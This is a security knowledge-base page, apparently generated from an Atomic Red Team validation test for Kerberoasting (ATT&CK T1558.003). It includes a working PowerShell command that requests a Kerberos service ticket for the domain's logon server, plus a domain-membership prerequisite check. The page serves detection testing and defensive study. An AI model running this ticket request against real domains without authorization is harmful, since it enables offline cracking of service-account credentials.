---
atomic_guid: "988539bc-2ed7-4e62-aec6-7c5cf6680863"
title: "Request A Single Ticket via PowerShell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1558.003"
attack_technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "988539bc-2ed7-4e62-aec6-7c5cf6680863"
  - "Request A Single Ticket via PowerShell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Request A Single Ticket via PowerShell

The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. 
A successful execution will output the SPNs for the endpoint in question.

## Metadata

- Atomic GUID: 988539bc-2ed7-4e62-aec6-7c5cf6680863
- Technique: T1558.003: Steal or Forge Kerberos Tickets: Kerberoasting
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1558.003/T1558.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1558-steal_or_forge_kerberos_tickets|T1558.003]]

## Dependencies

Computer must be domain joined

### Prerequisite Check

```text
if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
Write-Host Joining this computer to a domain must be done manually
```

## Executor

- name: powershell

### Command

```powershell
Add-Type -AssemblyName System.IdentityModel
$ComputerFQDN=$env:LogonServer.trimStart('\') + "." + $env:UserDnsDomain
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/$ComputerFQDN"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.yaml)
